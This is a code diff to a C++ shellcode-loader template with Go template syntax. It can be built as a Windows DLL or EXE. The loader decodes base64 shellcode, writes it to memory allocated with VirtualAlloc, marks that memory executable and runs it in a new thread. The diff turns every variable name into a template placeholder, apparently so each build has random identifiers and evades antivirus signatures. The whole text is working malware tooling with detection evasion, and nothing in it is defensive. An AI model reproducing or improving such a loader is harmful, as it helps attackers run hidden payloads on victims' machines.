@@ -1,4 +1,4 @@
-#include <Windows.h>
+#include <windows.h>
 #include <iostream>
 #include <vector>
 
@@ -7,28 +7,28 @@
 
 {{ if eq .Format "dll" }}
 
-BOOL WINAPI DllMain(HINSTANCE hInst, DWORD fdwReason, LPVOID lpvReserved) {
- if (fdwReason != DLL_PROCESS_ATTACH)
+BOOL WINAPI DllMain(HINSTANCE {{ index .V "hInst" }}, DWORD {{ index .V "fdwReason" }}, LPVOID {{ index .V "lpvReserved" }}) {
+if ({{ index .V "fdwReason" }} != DLL_PROCESS_ATTACH)
 	return true;
 
 {{ else if eq .Format "exe" }}
 	
-int main(int argc, char** argv) {
+int main(int {{ index .V "argc" }}, char** {{ index .V "argv" }}) {
 
 {{ end }}
 
-	std::vector<char> buffer = base64_decode(shellcode, shellcodeLen);
-	int bufferSize = buffer.size();
+	std::vector<char> {{ index .V "buffer" }} = {{ index .V "base64_decode" }}({{ index .V "shellcode" }}, {{ index .V "shellcodeLen" }});
+	int {{ index .V "bufferSize" }} = {{ index .V "buffer" }}.size();
 
-	LPVOID addressPointer = VirtualAlloc(NULL, bufferSize, 0x3000, 0x40);
-	memcpy(addressPointer, &buffer[0], bufferSize);
+	LPVOID {{ index .V "addressPointer" }} = VirtualAlloc(NULL, {{ index .V "bufferSize" }}, 0x3000, 0x40);
+	memcpy({{ index .V "addressPointer" }}, &{{ index .V "buffer" }}[0], {{ index .V "bufferSize" }});
 
-	DWORD dummy;
-	::VirtualProtect(addressPointer, bufferSize, PAGE_EXECUTE_READ, &dummy);
-	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addressPointer, NULL, 0, 0);
+	DWORD {{ index .V "dummy" }};
+	::VirtualProtect({{ index .V "addressPointer" }}, {{ index .V "bufferSize" }}, PAGE_EXECUTE_READ, &{{ index .V "dummy" }});
+	HANDLE {{ index .V "hThread" }} = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE){{ index .V "addressPointer" }}, NULL, 0, 0);
 
 	{{ if eq .Format "exe" }}
-	WaitForSingleObject(hThread, INFINITE);
+	WaitForSingleObject({{ index .V "hThread" }}, INFINITE);
 	{{ end }}
 
 	return true;
